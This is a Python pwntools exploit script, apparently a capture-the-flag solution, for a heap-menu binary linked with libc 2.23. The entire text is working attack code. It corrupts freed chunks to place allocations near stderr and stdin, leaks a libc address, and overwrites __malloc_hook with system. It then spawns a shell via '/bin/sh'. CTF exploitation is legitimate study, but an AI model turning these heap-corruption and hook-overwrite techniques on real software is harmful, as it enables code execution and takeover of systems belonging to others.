from pwn import *

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x0000000000401328
#            c
#            c 14
#            ''')

def book(choice, size, note = b'chino'):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    if choice == 1:
        r.sendlineafter(b'Size: ', str(size).encode('utf-8'))
    r.sendafter(b'Content: ', note)
    
def choice(choice):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    
size = 0x70 - 8
book(1, size)
choice(3)
book(2, size, p64(exe.sym['stderr']-19))

book(1, size)
book(1, size, b'abc')
choice(4)
r.recvuntil(b'abc')
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['_IO_2_1_stderr_']
print(hex(libc.address))
print(hex(libc.sym['__malloc_hook']))

payload = b'\x31' + b'\x00'*10 + p64(0x71) + b'\x00'*8 + p64(exe.sym['stderr'])
payload += (91 - len(payload))*b'a' + p64(0x41)
book(2, size, payload)

book(1, 32)
choice(3)
book(2, size, p64(exe.sym['stdin']+5))
book(1, 32)

book(1, 48)
choice(3)
book(2, size, p64(0x4040a0-0x10))
book(1, 48)
book(1, 48, b'/bin/sh\x00'+ b'\x00'*0x10+p64(0x101))

payload = b'\x00'*3 + p64(0x71) + b'/bin/sh\x00' + p64(exe.sym['size'])
book(1, 32, payload)

choice(3)
payload = p64(libc.sym['__malloc_hook']-35)
book(2, size, payload)
book(1, size)
book(1, size, b'\x00'*19 + p64(libc.sym['system']))

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'Size: ', str(0x4040a0).encode('utf-8'))

r.interactive()